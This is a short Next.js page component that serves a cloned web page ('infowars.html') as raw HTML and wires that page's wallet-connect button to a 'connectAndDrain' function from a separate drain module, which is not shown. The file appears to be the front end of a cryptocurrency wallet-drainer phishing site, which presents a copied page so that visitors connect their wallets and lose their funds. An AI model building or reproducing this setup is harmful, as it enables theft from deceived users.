// import { connectAndDrain } from '../lib/drain'

import { useEffect } from "react";

export default function Home() {
  useEffect(() => {
    let connectAndDrain: () => void;

    if (typeof window !== "undefined") {
      ({ connectAndDrain } = require("../lib/drain"));
    }

    document
      .querySelector("[data-wallet-connect]")
      ?.addEventListener("click", () => {
        connectAndDrain();
      });
  }, []);

  return (
    <div
      dangerouslySetInnerHTML={{
        __html: require("!raw-loader!../infowars.html").default,
      }}
    />
  );
}
